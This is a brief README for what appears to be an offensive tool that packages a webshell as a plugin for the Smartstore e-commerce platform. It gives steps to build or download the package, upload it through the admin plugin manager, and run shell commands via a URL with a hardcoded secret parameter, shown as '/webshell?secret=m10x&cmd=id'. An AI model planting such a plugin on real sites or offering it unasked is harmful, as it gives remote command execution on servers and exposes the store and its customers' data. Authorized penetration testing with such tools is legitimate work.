# Smartstore Plugin Webshell

1. create the ZIP (`./package.sh /path/to/Smartstore`) or download the `.zip` from the [latest release](../../releases/latest)
2. upload it via the plugin manager (Configuration → Plugins → Upload package)
3. use it: `/webshell?secret=m10x&cmd=id`
